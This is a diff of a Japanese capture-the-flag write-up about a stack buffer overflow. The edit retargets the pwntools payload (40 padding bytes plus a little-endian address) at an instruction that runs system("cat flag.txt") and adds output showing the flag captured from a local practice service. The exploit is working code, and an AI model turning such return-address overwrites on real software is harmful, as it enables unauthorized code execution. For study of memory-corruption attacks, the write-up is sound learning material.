@@ -65,7 +65,7 @@ main関数の変数は、
 ; var char *s @ rbp-0x20
 ```
 [s]はrbp-0x20のようにスタックが確保されている  
-[s]への入力を使ってmain関数のリターンアドレスをread_flag関数のアドレスに書き換えれば起動できるかもしれない
+[s]への入力を使ってmain関数のリターンアドレスを ~~read_flag関数のアドレス~~ ``system("cat flag.txt")``する命令のアドレスに書き換えれば起動できるかもしれない
 
 バイトオーダはリトルエンディアンでスタック1段の大きさが8バイトであり、それに合わせてペイロードを作る
 
@@ -73,8 +73,16 @@ main関数の変数は、
 from pwn import *
 
 io = remote('localhost', 4102)
-io.sendline("a"*40 + "\xd6\x11\x40\x00\x00\x00\x00\x00")
+io.sendline("a"*40 + "\xde\x11\x40\x00\x00\x00\x00\x00")
 io.interactive()
 ```
 
-できませんでした!
+```
+[vagrant@fedora32 second]$ python solve.py
+[+] Opening connection to localhost on port 4102: Done
+[*] Switching to interactive mode
+buf <flag{Y0u_c4n_0v3rwr1t3_r3turn_4ddr}
+[*] Got EOF while reading in interactive
+```
+
+できた!
